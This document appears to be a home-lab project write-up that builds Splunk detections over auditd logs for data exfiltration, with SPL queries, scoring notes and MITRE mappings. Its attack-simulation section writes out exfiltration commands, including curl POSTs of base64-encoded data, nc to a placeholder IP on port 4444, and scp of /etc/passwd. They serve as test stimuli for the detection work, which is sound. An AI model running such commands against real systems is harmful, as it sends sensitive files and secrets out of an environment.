# Project 11 — Data Exfiltration Detection

## Overview

This project builds behavioral detections around the data exfiltration phase — the moment collected data leaves the environment. Where Project 10 detected collection and staging, Project 11 detects the transfer itself: network tools making outbound connections, base64 encoding before transfer, and multi-signal behavioral chains that correlate staging and exfiltration in the same session.

Three detections were built: a network tool exfiltration detector using PROCTITLE-validated argument analysis, an encode-and-exfiltrate chain detector correlating base64 and network tools in the same session, and a combined exfiltration behavioral score pulling signals from four technique categories across Projects 10 and 11.

A key architectural lesson this project: scoring models must be mathematically monotonic — more evidence must produce higher confidence, not the same or lower. Eva caught two separate scoring model issues across three review cycles, both of which would have produced non-discriminative severity scores in production.

## Environment

| Component | Details |
|---|---|
| Host | Ubuntu Server 24.04 (splunk-server) |
| Hypervisor | Proxmox VE 9.1.1 on Dell OptiPlex 7060 Micro |
| SIEM | Splunk Enterprise 10.2.2 |
| Kernel | 6.8.0-124-generic |
| Log Source | auditd → Splunk Universal Forwarder → index=main |
| auditd Rules | 72 total (0 net new — existing keys provide all telemetry) |

## Project Metrics

| Metric | Value |
|---|---|
| Detections Built | 3 |
| auditd Rules Added | 0 |
| Attack Simulations Run | 1 |
| Splunk Alerts Saved | Pending developer license |
| MITRE Techniques Covered | 4 |
| Confidence Range | 0.95 – 1.0 |

## Why This Project Matters

Exfiltration is the payoff of every preceding attack phase. An attacker who has established access, escalated privileges, mapped the network, and collected sensitive files has one remaining objective — getting that data out. Network-based exfiltration detection is notoriously difficult because HTTPS to cloud storage looks identical to normal web traffic. Host-based behavioral detection bridges that gap: the tools used, the encoding applied, and the session context in which they fire are all visible at the kernel level even when the network traffic is encrypted.

The combined score in Detection 3 deliberately spans Projects 10 and 11 — correlating staging signals from the previous project with exfiltration signals from this one. This is the first detection in Domain 1 that builds a cross-project behavioral chain, demonstrating how BLIP-AI's session-scoped correlation can reconstruct a complete attack narrative from individual signal fragments.

---

## Phase 1 — Infrastructure

### auditd Rules

No new rules added. Existing coverage from previous projects provides all necessary telemetry:

- `download_tool` — watches curl and wget ✅ (Project 5)
- `encoding_tool` — watches base64 ✅ (Project 5)
- `proc_exec` — catches scp, nc, and archive tools ✅ (Project 6)
- `staging_write` — watches writes to /tmp, /dev/shm, /var/tmp ✅ (Project 10)

This is the second consecutive project with zero new auditd rules — a sign of mature detection infrastructure where existing broad telemetry supports new detection categories through SPL-level filtering alone.

---

## Phase 2 — Attack Simulation

Simulates the complete exfiltration sequence following collection staging:

```bash
# Attack 1 — curl POST to raw IP destination
curl -s -X POST http://1.2.3.4/upload -d "test data" 2>/dev/null || true

# Attack 2 — wget to external destination
wget -q -O /dev/null http://1.2.3.4/file 2>/dev/null || true

# Attack 3 — base64 encode then curl (encode-before-transfer chain)
echo "sensitive data" | base64 | curl -s -X POST http://1.2.3.4/exfil --data-binary @- 2>/dev/null || true

# Attack 4 — SCP outbound file transfer
scp /etc/passwd labadmin@10.10.10.132:/tmp/ 2>/dev/null || true

# Attack 5 — nc data transfer
echo "loot data" | nc -w3 1.2.3.4 4444 2>/dev/null || true
```

**What auditd recorded:**
- `download_tool` — curl and wget executions ✅
- `encoding_tool` — base64 execution ✅
- `proc_exec` — scp execution ✅

<img width="1255" height="128" alt="Screenshot 2026-06-15 at 6 11 02 PM" src="https://github.com/user-attachments/assets/13bad325-982e-41af-b9a4-26f9b359998f" />


---

## Phase 3 — Detections

### Detection 1 — Network Tool Exfiltration Detected

**Description:** Detects curl and wget executions from interactive sessions where PROCTITLE confirms raw IP destinations or POST method usage. Requires PROCTITLE evidence — events without argument visibility are excluded to prevent blind curl/wget executions from inflating exfiltration confidence.

**MITRE:** T1041 — Exfiltration Over C2 Channel, T1048 — Exfiltration Over Alternative Protocol

**Evidence Weight:** 0.95 CRITICAL

**Key design decisions:**
- `has_proctitle` uses length-safe check: `len(trim(mvjoin(decoded,"")))>0` — prevents empty-string masking
- `stats values(decoded) by event_id` in subsearch prevents multi-row ambiguity
- `| where has_proctitle=1` enforces strict evidence requirement — no silent degradation
- Raw IP destination scores higher than hostname — legitimate services use FQDNs

```spl
index=main sourcetype=linux_audit earliest=-60m
"download_tool" "type=SYSCALL"
| rex field=_raw "auid=(?P<auid>\d+)"
| rex field=_raw "ses=(?P<ses>\d+)"
| rex field=_raw "comm=\"(?P<comm>[^\"]+)\""
| rex field=_raw "exe=\"(?P<exe>[^\"]+)\""
| rex field=_raw "tty=(?P<tty>\S+)"
| rex field=_raw "success=(?P<success>\w+)"
| rex field=_raw "msg=audit\([^:]+:(?P<event_id>\d+)\)"
| where success="yes" OR success="1"
| where auid!=4294967295
| where tty!="(none)"
| where match(comm,"^(curl|wget)$")
| join type=left event_id [
    search index=main sourcetype=linux_audit earliest=-60m latest=now "type=PROCTITLE"
    | rex field=_raw "msg=audit\([^:]+:(?P<event_id>\d+)\)"
    | rex field=_raw "proctitle=(?P<proctitle_hex>[A-Fa-f0-9]+)"
    | eval proctitle_clean=replace(proctitle_hex,"00"," ")
    | eval decoded=lower(urldecode(replace(proctitle_clean,"([A-Fa-f0-9]{2})","%" . "\1")))
    | stats values(decoded) as decoded by event_id
    | table event_id decoded
]
| eval has_proctitle=if(len(trim(mvjoin(decoded,"")))>0,1,0)
| where has_proctitle=1
| eval raw_ip_dest=if(
    match(decoded,"https?://\d+\.\d+\.\d+\.\d+"),
    1, 0
)
| eval post_method=if(
    match(decoded,"-x post|-X POST|--request post|--request POST|--data|--data-binary|-d "),
    1, 0
)
| eval evidence_weight=case(
    raw_ip_dest=1 AND post_method=1, 0.95,
    raw_ip_dest=1, 0.85,
    post_method=1, 0.80,
    true(), 0.65
)
| stats
    count as event_count
    values(comm) as tools_used
    values(decoded) as commands_run
    max(raw_ip_dest) as raw_ip_dest
    max(post_method) as post_method
    max(evidence_weight) as evidence_weight
    min(_time) as first_seen
    max(_time) as last_seen
    by auid ses host
| eval detection="Network Tool Exfiltration Detected"
| eval severity=case(evidence_weight>=0.90,"CRITICAL",evidence_weight>=0.75,"HIGH",true(),"MEDIUM")
| eval first_seen=strftime(first_seen,"%Y-%m-%d %H:%M:%S")
| eval last_seen=strftime(last_seen,"%Y-%m-%d %H:%M:%S")
| table detection severity evidence_weight auid ses host event_count tools_used raw_ip_dest post_method commands_run first_seen last_seen
```

<img width="1255" height="581" alt="Screenshot 2026-06-15 at 6 15 45 PM" src="https://github.com/user-attachments/assets/c2586ce4-64d9-465c-bac9-6177babb0b06" />

**Alert Settings:**
- Title: `Network Tool Exfiltration Detected`
- Permissions: Shared in App
- Alert type: Scheduled — `*/5 * * * *`
- Time Range: Last 60 minutes
- Expires: 24 hours
- Trigger: Number of Results greater than 0 — Per-Result
- Throttle: 600 seconds
- Severity: Critical

---

### Detection 2 — Encode and Exfiltrate Chain Detected

**Description:** Detects base64 encoding and network transfer tool execution in the same session. The encode-before-transfer chain is a classic content inspection bypass technique. Dynamic weighted confidence scoring — severity derived from signal combination, not hardcoded.

**MITRE:** T1027 — Obfuscated Files or Information, T1041 — Exfiltration Over C2 Channel

**Confidence:** 1.0 CRITICAL

**Why no PROCTITLE required:** The behavioral chain itself is the signal. Whether the attacker encodes `/etc/shadow` or `test.txt`, the pattern of encoding then transferring in the same session is suspicious regardless of argument visibility. This is an intentional design choice distinct from Detection 1.

```spl
index=main sourcetype=linux_audit earliest=-60m
("encoding_tool" OR "download_tool") "type=SYSCALL"
| rex field=_raw "auid=(?P<auid>\d+)"
| rex field=_raw "ses=(?P<ses>\d+)"
| rex field=_raw "comm=\"(?P<comm>[^\"]+)\""
| rex field=_raw "tty=(?P<tty>\S+)"
| rex field=_raw "success=(?P<success>\w+)"
| rex field=_raw "key=\"(?P<key>[^\"]+)\""
| where success="yes" OR success="1"
| where auid!=4294967295
| where tty!="(none)"
| eval technique=case(
    key="encoding_tool" AND comm="base64", "encoding",
    key="download_tool" AND match(comm,"^(curl|wget)$"), "network_transfer",
    true(), null()
)
| where isnotnull(technique)
| eval technique_weight=case(
    technique="encoding", 0.70,
    technique="network_transfer", 0.75,
    true(), 0.60
)
| stats
    dc(technique) as technique_count
    values(technique) as techniques_detected
    values(comm) as tools_used
    sum(technique_weight) as raw_score
    min(_time) as first_seen
    max(_time) as last_seen
    by auid ses host
| where technique_count >= 2
| eval combined_confidence=min(round(raw_score/technique_count * 1.10, 2), 1.0)
| eval severity=case(
    combined_confidence>=0.80, "CRITICAL",
    combined_confidence>=0.65, "HIGH",
    true(), "MEDIUM"
)
| eval detection="Encode and Exfiltrate Chain Detected"
| eval description="base64 encoding AND network transfer tool both executed in same session — encode-before-exfiltrate pattern."
| eval first_seen=strftime(first_seen,"%Y-%m-%d %H:%M:%S")
| eval last_seen=strftime(last_seen,"%Y-%m-%d %H:%M:%S")
| table detection severity combined_confidence auid ses host technique_count techniques_detected tools_used first_seen last_seen description
```

<img width="1255" height="534" alt="Screenshot 2026-06-15 at 6 18 50 PM" src="https://github.com/user-attachments/assets/7f9db770-34dd-4b43-989f-781e770708f3" />


**Alert Settings:**
- Title: `Encode and Exfiltrate Chain Detected`
- Permissions: Shared in App
- Alert type: Scheduled — `*/5 * * * *`
- Time Range: Last 60 minutes
- Expires: 24 hours
- Trigger: Number of Results greater than 0 — Per-Result
- Throttle: 600 seconds
- Severity: Critical

---

### Detection 3 — Combined Exfiltration Behavioral Score

**Description:** Correlates four exfiltration-phase technique categories in the same session — network transfer, encoding, file staging, and archive creation. Pulls signals from both Project 10 (staging) and Project 11 (exfiltration) keys, building the first cross-project behavioral chain in Domain 1. Normalized weighted scoring with minimum 0.75 confidence gate.

**MITRE:** T1041, T1048, T1027, T1074.001, T1560.001

**Confidence:** 1.0 CRITICAL

**Scoring model notes (from Eva review):**
- Additive saturation (`raw_score * 1.05`) was rejected — breaks monotonicity when technique_count varies
- Normalized scoring (`raw_score / technique_count * 1.10`) restored — consistent with all other combined scores
- `scp` removed from file_staging technique — it is a network transfer tool, not a staging tool
- `| where combined_confidence >= 0.75` gate added — prevents low-signal pairs from inflating to HIGH

```spl
index=main sourcetype=linux_audit earliest=-60m
("download_tool" OR "encoding_tool" OR "staging_write" OR "proc_exec") "type=SYSCALL"
| rex field=_raw "auid=(?P<auid>\d+)"
| rex field=_raw "ses=(?P<ses>\d+)"
| rex field=_raw "comm=\"(?P<comm>[^\"]+)\""
| rex field=_raw "tty=(?P<tty>\S+)"
| rex field=_raw "success=(?P<success>\w+)"
| rex field=_raw "key=\"(?P<key>[^\"]+)\""
| where success="yes" OR success="1"
| where auid!=4294967295
| where tty!="(none)"
| eval technique=case(
    key="download_tool" AND match(comm,"^(curl|wget)$"), "network_transfer",
    key="encoding_tool" AND comm="base64", "encoding",
    key="staging_write" AND match(comm,"^(cp|mv|tee|dd|rsync|install)$"), "file_staging",
    key="proc_exec" AND match(comm,"^(tar|zip|gzip)$"), "archive_creation",
    true(), null()
)
| where isnotnull(technique)
| eval technique_weight=case(
    technique="network_transfer", 0.80,
    technique="encoding", 0.70,
    technique="file_staging", 0.75,
    technique="archive_creation", 0.75,
    true(), 0.50
)
| stats
    dc(technique) as technique_count
    values(technique) as techniques_detected
    values(comm) as tools_used
    sum(technique_weight) as raw_score
    min(_time) as first_seen
    max(_time) as last_seen
    by auid ses host
| where technique_count >= 2
| eval combined_confidence=min(round(raw_score/technique_count * 1.10, 2), 1.0)
| where combined_confidence >= 0.75
| eval severity=case(
    combined_confidence>=0.90, "CRITICAL",
    combined_confidence>=0.75, "HIGH",
    true(), "MEDIUM"
)
| eval detection="Combined Exfiltration Behavioral Score"
| eval description="Multiple exfiltration-phase signals detected in same session. Staging, encoding, and network transfer in combination confirms active data exfiltration."
| eval first_seen=strftime(first_seen,"%Y-%m-%d %H:%M:%S")
| eval last_seen=strftime(last_seen,"%Y-%m-%d %H:%M:%S")
| table detection severity combined_confidence auid ses host technique_count techniques_detected tools_used first_seen last_seen description
```

<img width="1255" height="624" alt="Screenshot 2026-06-15 at 6 21 42 PM" src="https://github.com/user-attachments/assets/2185daea-c6fb-4358-a29b-e03199dc2c09" />

**Alert Settings:**
- Title: `Combined Exfiltration Behavioral Score`
- Permissions: Shared in App
- Alert type: Scheduled — `*/5 * * * *`
- Time Range: Last 60 minutes
- Expires: 24 hours
- Trigger: Number of Results greater than 0 — Per-Result
- Throttle: 600 seconds
- Severity: Critical

---

## Phase 4 — Validation

| Detection | Attack Run | auditd Verified | Splunk Result | Eva Approved |
|---|---|---|---|---|
| 1 — Network Tool Exfiltration | ✅ | ✅ download_tool curl + wget | ✅ 2 rows, 0.95 CRITICAL | ✅ (2 review cycles) |
| 2 — Encode and Exfiltrate Chain | ✅ | ✅ encoding_tool + download_tool | ✅ 2 rows, 1.0 CRITICAL | ✅ (2 review cycles) |
| 3 — Combined Exfiltration Score | ✅ | ✅ all 4 technique categories | ✅ 2 rows, 1.0 CRITICAL | ✅ (3 review cycles) |

**Note:** Alerts pending save — Splunk developer license requested during Project 10. Alerts will be saved upon license receipt.

---

## Known Limitations

| Limitation | Impact | V2 Fix |
|---|---|---|
| raw_ip_dest only catches IPv4 | IPv6 and obfuscated DNS destinations missed | Expand regex to cover IPv6 and encoded destinations |
| PROCTITLE required for D1 | Events without PROCTITLE excluded entirely | Accept as design constraint — document gap |
| Session correlation weakness | staging_write and download_tool may not share identical ses | Add host + time-window fallback correlation |
| No DNS exfiltration detection | DNS tunneling not covered by these keys | Add Zeek DNS log integration in Domain 2 |
| No HTTPS content inspection | Encrypted transfers indistinguishable from legitimate traffic | Network-layer inspection in Domain 2 |
| join 50k row limit | May miss events on high-volume systems | Replace with transaction event_id in V2 |

---

## MITRE ATT&CK Mapping

| Technique | ID | Detection |
|---|---|---|
| Exfiltration Over C2 Channel | T1041 | Detection 1, 2, 3 |
| Exfiltration Over Alternative Protocol | T1048 | Detection 1, 3 |
| Obfuscated Files or Information | T1027 | Detection 2, 3 |
| Data Staged: Local Data Staging | T1074.001 | Detection 3 |
| Archive Collected Data | T1560.001 | Detection 3 |

---
